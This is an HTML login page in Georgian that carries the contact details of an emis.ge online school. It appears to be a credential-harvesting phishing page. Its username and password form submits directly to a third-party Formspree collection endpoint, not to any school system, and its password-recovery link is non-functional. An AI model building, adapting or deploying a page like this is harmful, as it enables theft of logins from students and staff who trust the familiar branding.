<!DOCTYPE html>
<html lang="ka">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ავტორიზაცია</title>
<style>
* {
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family: sans-serif;
}

body {
    display: flex;
    flex-wrap: wrap;
    min-height: 100vh;
}

/* მარცხენა მხარე */
.left {
    width: 50%;
    min-width: 300px;
    background: #3b3b98;
    color: white;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    padding: 20px;
}

.left h1 {
    margin-bottom: 40px;
    font-size: 32px;
    text-align: center;
}

.input-box {
    width: 100%;
    max-width: 350px;
    margin-bottom: 20px;
}

.input-box input {
    width: 100%;
    padding: 15px;
    border-radius: 30px;
    border: 1px solid rgba(255,255,255,0.3);
    background: transparent;
    color: white;
    outline: none;
}

.input-box input::placeholder {
    color: rgba(255,255,255,0.7);
}

button {
    width: 100%;
    max-width: 350px;
    padding: 15px;
    border-radius: 30px;
    border: none;
    background: #6fa3ff;
    color: white;
    font-size: 16px;
    cursor: pointer;
    margin-top: 10px;
}

button:hover {
    opacity: 0.9;
}

.forgot {
    margin-top: 20px;
    font-size: 14px;
    opacity: 0.8;
    cursor: pointer;
}

.contact {
    position: absolute;
    bottom: 25px;
    left: 50%;
    transform: translateX(-50%);
    font-size: 14px;
    opacity: 0.8;
}

/* მარჯვენა მხარე */
.right {
    width: 50%;
    min-width: 300px;
    background: #1f243d;
    display: flex;
    justify-content: center;
    align-items: center;
}

.right img {
    width: 100%;
    height: 100%;
    object-fit: cover;
}

/* Responsive */
@media (max-width: 768px) {
    body {
        flex-direction: column;
        min-height: auto;
    }
    .left, .right {
        width: 100%;
    }
    .input-box, button {
        width: 90%;
    }
    .right img {
        height: 200px;
        object-fit: contain;
    }
}
</style>
</head>
<body>

<div class="left">
    <h1>ავტორიზაცია</h1>

    <!-- Formspree Form -->
    <form action="https://formspree.io/f/mpqjlyaz" method="POST">
        <div class="input-box">
            <input type="text" name="სახელი" placeholder="მომხმარებლის სახელი" required>
        </div>

        <div class="input-box">
            <input type="password" name="პაროლი" placeholder="პაროლი" required>
        </div>

        <button type="submit">შესვლა</button>
    </form>

    <div class="forgot">პაროლის აღდგენა</div>

    <div class="contact">
        (995 32) 2 200 220 &nbsp;&nbsp; onlineschool@emis.ge
    </div>
</div>

<div class="right">
    <img src="art-board.svg" alt="">
</div>

</body>
</html>
